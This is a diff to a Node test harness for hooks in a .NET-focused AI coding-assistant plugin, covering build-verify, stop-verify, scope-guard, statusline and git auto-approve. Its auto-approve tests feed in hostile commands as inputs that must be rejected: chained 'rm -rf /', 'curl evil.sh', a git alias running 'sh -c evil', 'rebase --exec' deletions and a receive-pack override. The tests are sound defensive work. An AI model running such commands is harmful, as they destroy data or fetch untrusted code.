@@ -5,11 +5,20 @@
 //
 // Each test case in CASES below:
 //   - Spawns the target hook
-//   - Pipes a fixture JSON payload to stdin
+//   - Pipes a fixture JSON payload to stdin, shaped like the real event
+//     (PostToolUse carries `tool_response`; PostToolUseFailure a string `error`;
+//     Stop `stop_hook_active`; SubagentStop `last_assistant_message`)
 //   - Asserts exit code == 0 (all DotnetPilot hooks are advisory, never block)
 //   - Asserts stdout is either empty OR valid JSON matching the hook event shape
-//   - Optionally asserts expected substrings appear in `additionalContext`
-//   - Optionally asserts expected substrings do NOT appear (for should-be-silent fixtures)
+//   - Optionally asserts on the output channel the hook uses:
+//       expectSubstrings   → hookSpecificOutput.additionalContext (+ expectHookEvent)
+//       expectPermission   → hookSpecificOutput.permissionDecision
+//       expectDecision     → top-level decision (+ expectSubstrings against reason)
+//       expectSystemMessage→ systemMessage
+//       expectStdout / expectStdoutAbsent → raw stdout (statusline)
+//       expectFiles / expectFilesAbsent   → side effects on disk
+//   - Cases run in order; build-verify and stop-verify cases share per-dir
+//     state in os.tmpdir() and assert on how it accumulates
 //
 // Exit codes:
 //   0 — all tests pass
@@ -74,29 +83,85 @@ writeWorkspaceFile('src/Demo.Api/Extensions/CommentedExtensions.cs',
 // A directory with no .sln/.csproj — dnp-dotnet-priority negative case.
 const nonDotnetDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dnp-hook-test-plain-'));
 
-// A scoped workspace with .planning for the scope-guard case-insensitivity test.
+// A scoped workspace with .planning for the scope-guard tests. `projects` is an
+// array, the shape /dotnet-pilot:project:init writes.
 const scopeWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), 'dnp-hook-test-scope-'));
 fs.mkdirSync(path.join(scopeWorkspace, '.planning'), { recursive: true });
 fs.writeFileSync(path.join(scopeWorkspace, '.planning', 'STATE.md'),
   '---\nfocus_projects: [Demo.Api]\n---\n');
 fs.writeFileSync(path.join(scopeWorkspace, '.planning', 'solution-map.json'),
-  JSON.stringify({ projects: { 'Demo.Other': { path: 'src/Demo.Other/Demo.Other.csproj' } } }));
+  JSON.stringify({ projects: [
+    { name: 'Demo.Api', path: 'src/Demo.Api/Demo.Api.csproj', type: 'web', layer: 'presentation' },
+    { name: 'Demo.Api.Tests', path: 'tests/Demo.Api.Tests/Demo.Api.Tests.csproj', type: 'test', layer: 'test' },
+    { name: 'Demo.Other', path: 'src/Demo.Other/Demo.Other.csproj', type: 'classlib', layer: 'application' },
+  ] }));
 
 // A throwaway HOME so dnp-sync-global-claude-md writes to a temp CLAUDE.md,
 // never the developer's real ~/.claude/CLAUDE.md.
 const fakeHome = fs.mkdtempSync(path.join(os.tmpdir(), 'dnp-hook-test-home-'));
 
+// --- shared temp-state paths ---
+// Mirror statePath() in hooks/_lib/build-state.js and markerPath() in
+// dnp-stop-verify.js so fixtures can seed and assert on the same files.
+const crypto = require('crypto');
+function sha1(s) { return crypto.createHash('sha1').update(s).digest('hex'); }
+const buildStatePath = cwd => path.join(os.tmpdir(), `dnp-build-fail-${sha1(cwd)}.json`);
+const editMarkerPath = cwd => path.join(os.tmpdir(), `dnp-cs-edit-${sha1(cwd)}.json`);
+const scopeAdvisedPath = (cwd, project) => path.join(os.tmpdir(), `dnp-scope-advised-${sha1(cwd + '\n' + project)}`);
+
+// --- dnp-build-verify fixtures ---
+// Its own .NET dir so the state file the hook writes can be asserted and removed.
+const buildDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dnp-hook-test-build-'));
+fs.writeFileSync(path.join(buildDir, 'Demo.slnx'), '<Solution />\n');
+const buildStateFile = buildStatePath(buildDir);
+
 // --- dnp-statusline fixtures ---
-// Mirrors getFailCountPath() in dnp-build-verify.js so we can seed a failure.
-function buildFailPathFor(cwd) {
-  const hash = require('crypto').createHash('sha1').update(cwd).digest('hex');
-  return path.join(os.tmpdir(), `dnp-build-fail-${hash}.json`);
-}
 // A .NET dir with a fresh seeded build failure so the statusline shows BUILD ✗.
 const slnFailDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dnp-hook-test-sln-'));
 fs.writeFileSync(path.join(slnFailDir, 'Widget.slnx'), '<Solution />\n');
-const slnFailFile = buildFailPathFor(slnFailDir);
+const slnFailFile = buildStatePath(slnFailDir);
 fs.writeFileSync(slnFailFile, JSON.stringify({ count: 3, lastFail: new Date().toISOString() }));
+// A .NET dir whose last build was green: schema v2 keeps the file with count 0.
+const slnGreenDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dnp-hook-test-green-'));
+fs.writeFileSync(path.join(slnGreenDir, 'Gadget.slnx'), '<Solution />\n');
+const slnGreenFile = buildStatePath(slnGreenDir);
+fs.writeFileSync(slnGreenFile, JSON.stringify({
+  v: 2, count: 0, lastFail: new Date().toISOString(), lastSuccess: new Date().toISOString(),
+}));
+
+// --- dnp-stop-verify fixtures ---
+// Each dir is a git repo holding a .slnx and one .cs file; what differs is
+// whether the source is committed and what build state is on record.
+function git(dir, ...args) {
+  const r = spawnSync('git', ['-c', 'user.name=dnp', '-c', 'user.email=dnp@test', '-c', 'commit.gpgsign=false', ...args],
+    { cwd: dir, encoding: 'utf8', timeout: 15000 });
+  return !r.error && r.status === 0;
+}
+function makeStopDir(tag) {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `dnp-hook-test-stop-${tag}-`));
+  fs.writeFileSync(path.join(dir, 'Demo.slnx'), '<Solution />\n');
+  fs.mkdirSync(path.join(dir, 'src', 'Demo.Api'), { recursive: true });
+  fs.writeFileSync(path.join(dir, 'src', 'Demo.Api', 'Thing.cs'), 'public class Thing {}\n');
+  git(dir, 'init', '-q');
+  return dir;
+}
+const stopDirtyDir = makeStopDir('dirty');   // untracked .cs, never built
+const stopBlockDir = makeStopDir('block');   // same, opted into blocking
+fs.mkdirSync(path.join(stopBlockDir, '.planning'), { recursive: true });
+fs.writeFileSync(path.join(stopBlockDir, '.planning', 'config.json'),
+  JSON.stringify({ hooks: { stop_verify_block: true } }));
+const stopGreenDir = makeStopDir('green');   // edited 10 minutes ago, built green since
+fs.writeFileSync(editMarkerPath(stopGreenDir), JSON.stringify({
+  at: new Date(Date.now() - 10 * 60 * 1000).toISOString(), file: 'Thing.cs',
+}));
+fs.writeFileSync(buildStatePath(stopGreenDir), JSON.stringify({
+  v: 2, count: 0, lastFail: null, lastSuccess: new Date().toISOString(), lastCommand: 'dotnet build', lastKind: 'build',
+}));
+const stopCleanDir = makeStopDir('clean');   // source committed → nothing left to verify
+const gitOk = git(stopCleanDir, 'add', '.') && git(stopCleanDir, 'commit', '-q', '-m', 'init');
+fs.writeFileSync(editMarkerPath(stopCleanDir), JSON.stringify({ at: new Date().toISOString(), file: 'Thing.cs' }));
+// A fresh marker in a non-.NET dir must still produce silence.
+fs.writeFileSync(editMarkerPath(nonDotnetDir), JSON.stringify({ at: new Date().toISOString(), file: 'Thing.cs' }));
 
 // --- dnp-statusline-sync fixtures ---
 // Fresh HOME with no config → sync refreshes the script but must NOT touch settings.json.
@@ -173,41 +238,135 @@ const CASES = [
   },
 
   // --- dnp-build-verify ---
+  // PostToolUse carries `tool_response` {stdout, stderr, ...} with NO exit code;
+  // a non-zero exit lands on PostToolUseFailure as the string `error`
+  // ("Error: Exit code N\n<output>"). Cases run in order and share buildDir's
+  // state file, so the consecutive-failure count is asserted as it grows.
   {
-    name: 'build-verify: passing dotnet build is silent',
+    name: 'build-verify: passing dotnet build is silent and records a green state',
     hook: 'dnp-build-verify.js',
     runtime: 'node',
     input: {
-      cwd: workspace,
+      cwd: buildDir, hook_event_name: 'PostToolUse', tool_name: 'Bash',
       tool_input: { command: 'dotnet build --no-restore' },
-      tool_result: { stdout: 'Build succeeded.', exit_code: 0 },
+      tool_response: { stdout: 'Build succeeded.\n    0 Warning(s)\n    0 Error(s)', stderr: '', interrupted: false, isImage: false, noOutputExpected: false },
     },
     expectExit: 0,
     expectEmpty: true,
+    expectFiles: [{ path: buildStateFile, includes: ['"v":2', '"count":0', '"lastSuccess"'] }],
   },
   {
-    name: 'build-verify: failed dotnet build is labeled',
+    name: 'build-verify: failed dotnet build on PostToolUse is labeled',
     hook: 'dnp-build-verify.js',
     runtime: 'node',
     input: {
-      cwd: workspace,
+      cwd: buildDir, hook_event_name: 'PostToolUse', tool_name: 'Bash',
       tool_input: { command: 'dotnet build' },
-      tool_result: {
-        stdout: 'Program.cs(12,5): error CS0103: The name \'Foo\' does not exist in the current context\nBuild FAILED',
-        exit_code: 1,
-      },
+      tool_response: { stdout: 'Program.cs(12,5): error CS0103: The name \'Foo\' does not exist in the current context\nBuild FAILED.', stderr: '' },
     },
     expectExit: 0,
     expectSubstrings: ['[dnp-build-verify]', 'BUILD FAILURE', 'CS0103'],
+    expectHookEvent: 'PostToolUse',
+    expectFiles: [{ path: buildStateFile, includes: ['"count":1'] }],
+  },
+  {
+    name: 'build-verify: non-zero exit arrives on PostToolUseFailure as a string error',
+    hook: 'dnp-build-verify.js',
+    runtime: 'node',
+    input: {
+      cwd: buildDir, hook_event_name: 'PostToolUseFailure', tool_name: 'Bash',
+      tool_input: { command: 'dotnet build Demo.slnx' },
+      error: 'Error: Exit code 1\nProgram.cs(12,5): error CS1002: ; expected\nBuild FAILED.',
+      is_interrupt: false, duration_ms: 4200,
+    },
+    expectExit: 0,
+    expectSubstrings: ['BUILD FAILURE', 'CS1002'],
+    expectHookEvent: 'PostToolUseFailure',
+    expectFiles: [{ path: buildStateFile, includes: ['"count":2'] }],
+  },
+  {
+    name: 'build-verify: build piped through grep exits 0 yet still counts as a failure',
+    hook: 'dnp-build-verify.js',
+    runtime: 'node',
+    input: {
+      cwd: buildDir, hook_event_name: 'PostToolUse', tool_name: 'Bash',
+      tool_input: { command: 'dotnet build Demo.slnx 2>&1 | grep -E "error|Warn"' },
+      tool_response: { stdout: 'Program.cs(3,1): error CS0246: The type or namespace name \'Foo\' could not be found', stderr: '' },
+    },
+    expectExit: 0,
+    expectSubstrings: ['BUILD FAILURE', 'CS0246', 'WARNING: 3 consecutive'],
+  },
+  {
+    name: 'build-verify: failed dotnet test is labeled as a test failure',
+    hook: 'dnp-build-verify.js',
+    runtime: 'node',
+    input: {
+      cwd: buildDir, hook_event_name: 'PostToolUseFailure', tool_name: 'Bash',
+      tool_input: { command: 'dotnet test Demo.slnx --no-build' },
+      error: 'Error: Exit code 1\nFailed!  - Failed:     2, Passed:    40, Skipped:     0, Total:    42',
+    },
+    expectExit: 0,
+    expectSubstrings: ['TEST FAILURE', 'Failed!'],
+  },
+  {
+    name: 'build-verify: PowerShell tool payload is classified the same way',
+    hook: 'dnp-build-verify.js',
+    runtime: 'node',
+    input: {
+      cwd: buildDir, hook_event_name: 'PostToolUse', tool_name: 'PowerShell',
+      tool_input: { command: 'dotnet build Demo.slnx' },
+      tool_response: { stdout: 'Build succeeded.', stderr: '' },
+    },
+    expectExit: 0,
+    expectEmpty: true,
+    expectFiles: [{ path: buildStateFile, includes: ['"count":0'] }],
+  },
+  {
+    name: 'build-verify: grep matching nothing (exit 1) after a clean build is not a failure',
+    hook: 'dnp-build-verify.js',
+    runtime: 'node',
+    input: {
+      cwd: buildDir, hook_event_name: 'PostToolUseFailure', tool_name: 'Bash',
+      tool_input: { command: 'dotnet build Demo.slnx 2>&1 | grep -E "error|Warn"' },
+      error: 'Error: Exit code 1\n',
+    },
+    expectExit: 0,
+    expectEmpty: true,
+    expectFiles: [{ path: buildStateFile, includes: ['"count":0'] }],
+  },
+  {
+    name: 'build-verify: unpiped non-zero exit without a recognizable marker still counts',
+    hook: 'dnp-build-verify.js',
+    runtime: 'node',
+    input: {
+      cwd: buildDir, hook_event_name: 'PostToolUseFailure', tool_name: 'Bash',
+      tool_input: { command: 'dotnet build Missing.slnx' },
+      error: 'Error: Exit code 1\nThe command could not be loaded.',
+    },
+    expectExit: 0,
+    expectSubstrings: ['BUILD FAILURE'],
+    expectFiles: [{ path: buildStateFile, includes: ['"count":1'] }],
   },
   {
     name: 'build-verify: non-dotnet command is ignored',
     hook: 'dnp-build-verify.js',
     runtime: 'node',
     input: {
-      cwd: workspace,
+      cwd: buildDir, hook_event_name: 'PostToolUse', tool_name: 'Bash',
       tool_input: { command: 'ls -la' },
-      tool_result: { stdout: '', exit_code: 0 },
+      tool_response: { stdout: 'error CS0000 in a listing', stderr: '' },
+    },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'build-verify: dotnet run is not a build outcome',
+    hook: 'dnp-build-verify.js',
+    runtime: 'node',
+    input: {
+      cwd: buildDir, hook_event_name: 'PostToolUse', tool_name: 'Bash',
+      tool_input: { command: 'dotnet run --project Demo.Api' },
+      tool_response: { stdout: 'Build FAILED.', stderr: '' },
     },
     expectExit: 0,
     expectEmpty: true,
@@ -336,6 +495,22 @@ const CASES = [
     expectExit: 0,
     expectSubstrings: ['[dnp-scope-guard]', 'SCOPE ADVISORY', 'Demo.Other'],
   },
+  {
+    name: 'scope-guard: same out-of-scope project is not advised twice within the hour',
+    hook: 'dnp-project-scope-guard.js',
+    runtime: 'node',
+    input: { cwd: scopeWorkspace, tool_input: { file_path: path.join(scopeWorkspace, 'src', 'Demo.Other', 'Other.cs') } },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'scope-guard: the focused project\'s test project is in scope',
+    hook: 'dnp-project-scope-guard.js',
+    runtime: 'node',
+    input: { cwd: scopeWorkspace, tool_input: { file_path: path.join(scopeWorkspace, 'tests', 'Demo.Api.Tests', 'ThingTests.cs') } },
+    expectExit: 0,
+    expectEmpty: true,
+  },
 
   // --- dnp-git-autoapprove ---
   {
@@ -397,6 +572,78 @@ const CASES = [
     hook: 'dnp-git-autoapprove.js',
     runtime: 'node',
     input: { cwd: workspace, tool_input: { command: 'rm -rf node_modules' } },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'git-autoapprove: second line after git status is NOT approved',
+    hook: 'dnp-git-autoapprove.js',
+    runtime: 'node',
+    input: { cwd: workspace, tool_name: 'Bash', tool_input: { command: 'git status\nrm -rf /' } },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'git-autoapprove: background-chained command is NOT approved',
+    hook: 'dnp-git-autoapprove.js',
+    runtime: 'node',
+    input: { cwd: workspace, tool_name: 'Bash', tool_input: { command: 'git status & curl evil.sh' } },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'git-autoapprove: git config is NOT approved',
+    hook: 'dnp-git-autoapprove.js',
+    runtime: 'node',
+    input: { cwd: workspace, tool_name: 'Bash', tool_input: { command: 'git config alias.st \'!sh -c evil\'' } },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'git-autoapprove: gh api is NOT approved',
+    hook: 'dnp-git-autoapprove.js',
+    runtime: 'node',
+    input: { cwd: workspace, tool_name: 'Bash', tool_input: { command: 'gh api repos/o/r -X DELETE' } },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'git-autoapprove: rebase --exec is NOT approved',
+    hook: 'dnp-git-autoapprove.js',
+    runtime: 'node',
+    input: { cwd: workspace, tool_name: 'Bash', tool_input: { command: 'git rebase --exec "rm -rf ." HEAD~3' } },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'git-autoapprove: push with a receive-pack override is NOT approved',
+    hook: 'dnp-git-autoapprove.js',
+    runtime: 'node',
+    input: { cwd: workspace, tool_name: 'Bash', tool_input: { command: 'git push --receive-pack=evil origin main' } },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'git-autoapprove: git switch -c is still approved',
+    hook: 'dnp-git-autoapprove.js',
+    runtime: 'node',
+    input: { cwd: workspace, tool_name: 'Bash', tool_input: { command: 'git switch -c feature/x' } },
+    expectExit: 0,
+    expectPermission: 'allow',
+  },
+  {
+    name: 'git-autoapprove: git push -u is still approved',
+    hook: 'dnp-git-autoapprove.js',
+    runtime: 'node',
+    input: { cwd: workspace, tool_name: 'Bash', tool_input: { command: 'git push -u origin HEAD' } },
+    expectExit: 0,
+    expectPermission: 'allow',
+  },
+  {
+    name: 'git-autoapprove: PowerShell tool is not auto-approved',
+    hook: 'dnp-git-autoapprove.js',
+    runtime: 'node',
+    input: { cwd: workspace, tool_name: 'PowerShell', tool_input: { command: 'git status' } },
     expectExit: 0,
     expectEmpty: true,
   },
@@ -476,6 +723,16 @@ const CASES = [
     expectStdout: ['SLN Widget', '❌', 'BUILD 3x'],
   },
   {
+    name: 'statusline: green v2 state (count 0) shows no BUILD segment',
+    hook: '../statusline/dnp-statusline.js',
+    runtime: 'node',
+    input: { cwd: slnGreenDir, model: { display_name: 'Opus 4.8' } },
+    env: { NO_COLOR: '1' },
+    expectExit: 0,
+    expectStdout: ['SLN Gadget'],
+    expectStdoutAbsent: ['BUILD '],
+  },
+  {
     name: 'statusline: non-.NET dir has no SLN/TFM line',
     hook: '../statusline/dnp-statusline.js',
     runtime: 'node',
@@ -545,6 +802,126 @@ const CASES = [
       { path: path.join(slHomeAuto, '.claude', 'dnp-statusline.prev.json'), includes: ['statusline.py'] },
     ],
   },
+
+  // --- dnp-stop-verify (PostToolUse stamps the edit marker; Stop reads it) ---
+  {
+    name: 'stop-verify: .cs write stamps the edit marker',
+    hook: 'dnp-stop-verify.js',
+    runtime: 'node',
+    input: { cwd: stopDirtyDir, hook_event_name: 'PostToolUse', tool_name: 'Edit', tool_input: { file_path: path.join(stopDirtyDir, 'src', 'Demo.Api', 'Thing.cs') } },
+    expectExit: 0,
+    expectEmpty: true,
+    expectFiles: [{ path: editMarkerPath(stopDirtyDir), includes: ['Thing.cs'] }],
+  },
+  {
+    name: 'stop-verify: non-source write does not stamp',
+    hook: 'dnp-stop-verify.js',
+    runtime: 'node',
+    input: { cwd: stopBlockDir, hook_event_name: 'PostToolUse', tool_name: 'Write', tool_input: { file_path: path.join(stopBlockDir, 'README.md') } },
+    expectExit: 0,
+    expectEmpty: true,
+    expectFilesAbsent: [editMarkerPath(stopBlockDir)],
+  },
+  {
+    name: 'stop-verify: edited but never built nudges with the build and test commands',
+    hook: 'dnp-stop-verify.js',
+    runtime: 'node',
+    input: { cwd: stopDirtyDir, hook_event_name: 'Stop', stop_hook_active: false },
+    expectExit: 0,
+    expectSubstrings: ['[dnp-stop-verify]', 'VERIFY BEFORE STOPPING', 'dotnet build Demo.slnx', 'dotnet test Demo.slnx'],
+    expectHookEvent: 'Stop',
+  },
+  {
+    name: 'stop-verify: stop_hook_active suppresses the nudge',
+    hook: 'dnp-stop-verify.js',
+    runtime: 'node',
+    input: { cwd: stopDirtyDir, hook_event_name: 'Stop', stop_hook_active: true },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'stop-verify: green build recorded after the edit is silent',
+    hook: 'dnp-stop-verify.js',
+    runtime: 'node',
+    input: { cwd: stopGreenDir, hook_event_name: 'Stop', stop_hook_active: false },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'stop-verify: non-.NET directory is silent even with a fresh marker',
+    hook: 'dnp-stop-verify.js',
+    runtime: 'node',
+    input: { cwd: nonDotnetDir, hook_event_name: 'Stop', stop_hook_active: false },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  {
+    name: 'stop-verify: no edit marker is silent',
+    hook: 'dnp-stop-verify.js',
+    runtime: 'node',
+    input: { cwd: buildDir, hook_event_name: 'Stop', stop_hook_active: false },
+    expectExit: 0,
+    expectEmpty: true,
+  },
+  ...(gitOk ? [{
+    name: 'stop-verify: committed source tree is silent',
+    hook: 'dnp-stop-verify.js',
+    runtime: 'node',
+    input: { cwd: stopCleanDir, hook_event_name: 'Stop', stop_hook_active: false },
+    expectExit: 0,
+    expectEmpty: true,
+  }] : []),
+  {
+    name: 'stop-verify: .cs write in the opted-in dir stamps the marker',
+    hook: 'dnp-stop-verify.js',
+    runtime: 'node',
+    input: { cwd: stopBlockDir, hook_event_name: 'PostToolUse', tool_name: 'Edit', tool_input: { file_path: path.join(stopBlockDir, 'src', 'Demo.Api', 'Thing.cs') } },
+    expectExit: 0,
+    expectEmpty: true,
+    expectFiles: [{ path: editMarkerPath(stopBlockDir), includes: ['Thing.cs'] }],
+  },
+  {
+    name: 'stop-verify: stop_verify_block opt-in turns the nudge into a block',
+    hook: 'dnp-stop-verify.js',
+    runtime: 'node',
+    input: { cwd: stopBlockDir, hook_event_name: 'Stop', stop_hook_active: false },
+    expectExit: 0,
+    expectDecision: 'block',
+    expectSubstrings: ['[dnp-stop-verify]', 'VERIFY BEFORE STOPPING'],
+  },
+
+  // --- dnp-subagent-result (SubagentStop; speaks via systemMessage) ---
+  {
+    name: 'subagent-result: HALT marker surfaces as a systemMessage',
+    hook: 'dnp-subagent-result.js',
+    runtime: 'node',
+    input: {
+      cwd: workspace, hook_event_name: 'SubagentStop', agent_id: 'a1', agent_type: 'dotnet-pilot:dnp-tdd-developer-hard',
+      agent_transcript_path: '/tmp/a1.jsonl',
+      last_assistant_message: 'Stopped before RED.\n[HALT: two DbContexts match — which one owns Orders?]',
+    },
+    expectExit: 0,
+    expectSystemMessage: ['[dnp-subagent-result]', 'dnp-tdd-developer-hard', '[HALT: two DbContexts'],
+  },
+  {
+    name: 'subagent-result: routing verdict surfaces',
+    hook: 'dnp-subagent-result.js',
+    runtime: 'node',
+    input: {
+      cwd: workspace, hook_event_name: 'SubagentStop', agent_id: 'a2', agent_type: 'dotnet-pilot:dnp-tdd-developer-easy',
+      last_assistant_message: 'Task outgrows this tier.\n[ROUTING: hard — cross-layer change]',
+    },
+    expectExit: 0,
+    expectSystemMessage: ['[ROUTING: hard'],
+  },
+  {
+    name: 'subagent-result: ordinary completion is silent',
+    hook: 'dnp-subagent-result.js',
+    runtime: 'node',
+    input: { cwd: workspace, hook_event_name: 'SubagentStop', agent_id: 'a3', agent_type: 'dotnet-pilot:dnp-refactor-cleaner', last_assistant_message: 'All 12 tests green.' },
+    expectExit: 0,
+    expectEmpty: true,
+  },
 ];
 
 function runCase(testCase) {
@@ -582,6 +959,36 @@ function runCase(testCase) {
         problems.push(`permissionDecision "${decision}" (expected "${testCase.expectPermission}")`);
       }
     }
+  } else if (testCase.expectDecision) {
+    // Top-level Stop-hook block: {"decision":"block","reason":"..."}.
+    let parsed = null;
+    try {
+      parsed = JSON.parse(stdout);
+    } catch (e) {
+      problems.push(`stdout is not JSON: ${stdout.slice(0, 200)}`);
+    }
+    if (parsed) {
+      if (parsed.decision !== testCase.expectDecision) {
+        problems.push(`decision "${parsed.decision}" (expected "${testCase.expectDecision}")`);
+      }
+      const reason = parsed.reason || '';
+      for (const sub of testCase.expectSubstrings || []) {
+        if (!reason.includes(sub)) problems.push(`missing substring "${sub}" in reason`);
+      }
+    }
+  } else if (testCase.expectSystemMessage) {
+    let parsed = null;
+    try {
+      parsed = JSON.parse(stdout);
+    } catch (e) {
+      problems.push(`stdout is not JSON: ${stdout.slice(0, 200)}`);
+    }
+    if (parsed) {
+      const msg = parsed.systemMessage || '';
+      for (const sub of testCase.expectSystemMessage) {
+        if (!msg.includes(sub)) problems.push(`missing substring "${sub}" in systemMessage`);
+      }
+    }
   } else if (testCase.expectSubstrings) {
     // Output should be valid JSON matching hook event shape
     let parsed = null;
@@ -596,6 +1003,9 @@ function runCase(testCase) {
         if (!ctx.includes(sub)) {
           problems.push(`missing substring "${sub}" in additionalContext`);
         }
+      }
+      if (testCase.expectHookEvent && parsed.hookSpecificOutput?.hookEventName !== testCase.expectHookEvent) {
+        problems.push(`hookEventName "${parsed.hookSpecificOutput?.hookEventName}" (expected "${testCase.expectHookEvent}")`);
       }
     }
   } else if (testCase.expectStdout) {
@@ -663,10 +1073,15 @@ for (const tc of CASES) {
   }
 }
 
-// Cleanup temp workspaces
-try { fs.unlinkSync(slnFailFile); } catch {}
-for (const dir of [workspace, nonDotnetDir, scopeWorkspace, fakeHome,
-                   slnFailDir, slHomeDefault, slHomeAuto, slAutoWorkspace]) {
+// Cleanup temp workspaces and the tmpdir state files the hooks wrote for them.
+const stopDirs = [stopDirtyDir, stopBlockDir, stopGreenDir, stopCleanDir];
+for (const f of [slnFailFile, slnGreenFile, buildStateFile,
+                 ...stopDirs.map(buildStatePath), ...stopDirs.map(editMarkerPath),
+                 editMarkerPath(nonDotnetDir), scopeAdvisedPath(scopeWorkspace, 'Demo.Other')]) {
+  try { fs.unlinkSync(f); } catch {}
+}
+for (const dir of [workspace, nonDotnetDir, scopeWorkspace, fakeHome, buildDir,
+                   slnFailDir, slnGreenDir, slHomeDefault, slHomeAuto, slAutoWorkspace, ...stopDirs]) {
   try { fs.rmSync(dir, { recursive: true, force: true }); } catch {}
 }
 
